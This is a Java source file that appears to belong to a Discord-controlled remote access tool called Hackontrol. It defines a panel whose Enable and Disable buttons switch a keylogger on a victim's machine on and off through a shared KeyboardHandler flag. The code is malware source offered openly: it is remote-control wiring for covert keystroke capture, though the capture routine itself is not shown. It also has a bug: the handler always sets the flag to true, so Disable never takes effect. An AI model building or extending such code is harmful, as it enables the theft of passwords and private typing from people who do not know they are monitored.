package com.khopan.hackontrol.panel;

import com.khopan.hackontrol.KeyboardHandler;
import com.khopan.hackontrol.registry.Registration;
import com.khopan.hackontrol.service.interaction.ButtonManager;
import com.khopan.hackontrol.service.interaction.ButtonManager.ButtonType;
import com.khopan.hackontrol.service.interaction.context.ButtonContext;
import com.khopan.hackontrol.utils.HackontrolMessage;

import net.dv8tion.jda.api.interactions.components.buttons.Button;

public class KeyLoggerPanel extends Panel {
	private static final String PANEL_NAME = "keylogger";

	private static final Button BUTTON_ENABLE  = ButtonManager.staticButton(ButtonType.SUCCESS, "Enable",  "keyloggerEnable");
	private static final Button BUTTON_DISABLE = ButtonManager.staticButton(ButtonType.DANGER,  "Disable", "keyloggerDisable");

	@Override
	public String panelName() {
		return KeyLoggerPanel.PANEL_NAME;
	}

	@Override
	public void registeration() {
		this.register(Registration.BUTTON, KeyLoggerPanel.BUTTON_ENABLE,  context -> this.buttonEnable(context, true));
		this.register(Registration.BUTTON, KeyLoggerPanel.BUTTON_DISABLE, context -> this.buttonEnable(context, false));
	}

	@Override
	public ControlWidget[] controlWidget() {
		return new ControlWidget[] {
				ControlWidget.newBuilder()
				.actionRow(KeyLoggerPanel.BUTTON_ENABLE, KeyLoggerPanel.BUTTON_DISABLE)
				.build()
		};
	}

	private void buttonEnable(ButtonContext context, boolean enable) {
		if(KeyboardHandler.Enable == enable) {
			HackontrolMessage.boldDeletable(context.reply(), "KeyLogger is already " + (enable ? "enabled" : "disabled"));
			return;
		}

		KeyboardHandler.Enable = true;
		context.deferEdit().queue();
	}
}
